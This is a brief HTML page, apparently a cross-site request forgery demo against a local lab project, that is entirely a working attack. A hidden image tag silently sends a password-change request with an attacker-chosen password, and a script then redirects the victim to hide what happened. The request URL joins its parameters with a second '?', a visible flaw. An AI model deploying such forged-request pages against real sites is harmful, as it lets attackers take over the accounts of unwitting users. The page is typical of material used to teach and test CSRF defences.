<!DOCTYPE html>
<html>
<head>
  <title>Attack CSRF - Change Password</title>
</head>
<body>
  <h1>Attack - Change Password</h1>

  <img src="http://localhost/CSRF_Project/change_password.php?password=NewPasswordAttacker?cpassword=NewPasswordAttacker" alt="Attack CSRF" style="display:none">

  <script>
    // Redireccionar a la víctima después de realizar la solicitud invisible
    setTimeout(function() {
      window.location.href = "home.php";
    }, 2000);
  </script>
</body>
</html>
